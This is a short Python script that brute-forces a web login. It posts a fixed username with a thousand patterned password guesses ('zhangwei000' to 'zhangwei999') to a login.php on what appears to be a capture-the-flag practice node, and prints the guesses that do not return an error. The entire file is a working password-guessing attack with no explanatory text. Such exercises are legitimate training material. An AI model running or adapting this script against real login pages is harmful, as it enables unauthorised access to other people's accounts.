import requests
url="http://b32ccf3a-4077-42fd-a27b-a6b7ef8df4bb.node3.buuoj.cn/login.php"

data={
    "username":"zhangwei",
    "password":"zhangwei{}"
}
basePassword="zhangwei{:0>3d}"
for i in range(1000):
    data["password"]=basePassword.format(i)
    response = requests.post(url=url,data=data)
    if("error" not in response.text):
        print(i)
    if(i%10==0):
        print(i)